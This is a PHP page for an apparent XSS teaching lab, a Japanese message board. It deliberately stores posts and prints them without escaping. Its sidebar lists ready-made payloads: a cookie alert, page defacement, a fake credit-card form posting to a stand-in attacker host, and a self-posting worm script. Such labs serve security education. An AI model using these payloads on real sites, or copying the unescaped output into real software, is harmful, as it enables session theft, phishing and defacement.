<?php
include '../includes/header.php';

// 表示用にDB接続（xssフォルダからは ../database.sqlite）
$db = new PDO('sqlite:../database.sqlite');
?>

<div class="card shadow-sm border-0 p-4">
    <h1 class="h5 fw-bold mb-4 text-warning">XSS 体験掲示板</h1>

    <div class="row g-4">
        <div class="col-md-4">
            <div class="list-group shadow-sm">
                <div class="list-group-item bg-dark text-white fw-bold small">アラートを出すよ</div>
                <button class="list-group-item list-group-item-action py-3" onclick="copyToInput(`<script>alert('XSS成功');</script>`)">
                    <code class="text-danger small">アラートを出すだけ</code>
                </button>
                <button class="list-group-item list-group-item-action py-3" onclick="copyToInput(`<img src=x onerror=alert('Cookie:'+document.cookie)>`)">
                    <code class="text-danger small">cookie情報をアラートに出す</code>
                </button>


                <div class="list-group-item bg-dark text-white fw-bold small"> ページ改変系</div>


                <button class="list-group-item list-group-item-action py-3" onclick="copyToInput('<script>document.body.innerHTML = `<div style=\'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;z-index:9999;font-family:monospace;font-size:2rem;\'>SYSTEM HACKED BY XSS LAB</div>`;</script>')">
                    <code class="text-danger small">全画面書き換え (ページ更新後黒塗り画面へ)</code>
                </button>

                <button class="list-group-item list-group-item-action py-3" onclick="copyToInput('<script>document.querySelector(\'.navbar\').style.backgroundColor = \'red\'; document.querySelector(\'.navbar-brand\').innerText = \'⚠️脆弱性あり⚠️\';</script>')">
                    <code class="text-danger small">ヘッダーの文字を変更</code>
                </button>

                <button class="list-group-item list-group-item-action py-3" onclick="copyToInput('<script>document.body.innerHTML += `<div style=\'position:fixed; top:0; left:0; width:100vw; height:100vh; background:white; z-index:9999; display:flex; align-items:center; justify-content:center; font-family:sans-serif;\'><div class=\'card shadow-lg border-0\' style=\'width:450px; padding:30px;\'><div class=\'text-center mb-4\'><h2 class=\'h4 fw-bold text-danger\'>⚠️ セキュリティ警告</h2><p class=\'text-muted small\'>お使いのアカウントに異常なアクセスが検出されました。<br>本人確認のため、決済情報の再登録が必要です。</p></div><form action=\'https://attacker-server.com/steal\' method=\'POST\'><div class=\'mb-3\'><label class=\'form-label small fw-bold\'>カード名義人</label><input type=\'text\' class=\'form-control\' placeholder=\'TARO YAMADA\' required></div><div class=\'mb-3\'><label class=\'form-label small fw-bold\'>カード番号</label><input type=\'text\' class=\'form-control\' placeholder=\'0000 0000 0000 0000\' maxlength=\'16\' required></div><div class=\'row\'><div class=\'col-7\'><label class=\'form-label small fw-bold\'>有効期限 (MM/YY)</label><input type=\'text\' class=\'form-control\' placeholder=\'MM/YY\' required></div><div class=\'col-5\'><label class=\'form-label small fw-bold\'>CVV</label><input type=\'password\' class=\'form-control\' placeholder=\'123\' maxlength=\'3\' required></div></div><div class=\'mt-4\'><button type=\'button\' class=\'btn btn-danger w-100 fw-bold\' onclick=\'alert(&quot;【警告】入力された情報は攻撃者のサーバーへ送信されます！&quot;); location.reload();\'>情報を更新してアカウントを復旧</button></div></form><p class=\'text-center mt-3 small\'><a href=\'#\' class=\'text-decoration-none text-muted\'>あとで設定する</a></p></div></div>`;</script>')">
                    <code class="text-danger small">クレジットカード詐欺フォームに書き換え (全画面)</code>
                </button>
                <div class="list-group-item bg-dark text-white fw-bold small">自動増殖・勝手に投稿系</div>
                <button class="list-group-item list-group-item-action py-3" onclick="copyToInput('<script>fetch(\'../db/message.php\', {method:\'POST\', headers:{\'Content-Type\':\'application/x-www-form-urlencoded\'}, body:\'message=\' + encodeURIComponent(\'🚨 このサイトはXSSワームに感染しました！\')}); alert(\'バックグラウンドで勝手に投稿しました。複数回リロードして確認してください。\');</script>')">
                    <code class="text-danger small">勝手に投稿をしてしまう</code>
                </button>
            </div>
        </div>

        <div class="col-md-8">
            <div class="p-3 border rounded bg-white shadow-sm mb-4">
                <form action="../db/message.php" method="POST">
                    <div class="input-group">
                        <input type="text" name="message" value="<?php echo htmlspecialchars($_GET['message'] ?? ''); ?>" id="it" class="form-control">
                        <button type="submit" class="btn btn-warning fw-bold">DBへ保存</button>
                    </div>
                </form>
            </div>

            <div class="card shadow-sm border-0">
                <div class="card-header bg-white d-flex justify-content-between align-items-center">
                    <span class="fw-bold small">MESSAGESテーブル (DB保存内容)</span>
                </div>
                <table class="table mb-0">
                    <thead class="table-light">
                        <tr>
                            <th style="width:10%">ID</th>
                            <th>CONTENT (出力時エスケープなし)</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        try {
                            $stmt = $db->query("SELECT * FROM messages ORDER BY id DESC");
                            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                                // 脆弱性のポイント：そのまま出力
                                echo "<tr><td>{$row['id']}</td><td>{$row['content']}</td></tr>";
                            }
                        } catch (Exception $e) {
                            echo "<tr><td colspan='2' class='text-center small py-4 text-muted'>データがありません。</td></tr>";
                        }
                        ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<script>
    function copyToInput(v) {
        document.getElementById('it').value = v;
    }
</script>

<?php include '../includes/footer.php'; ?>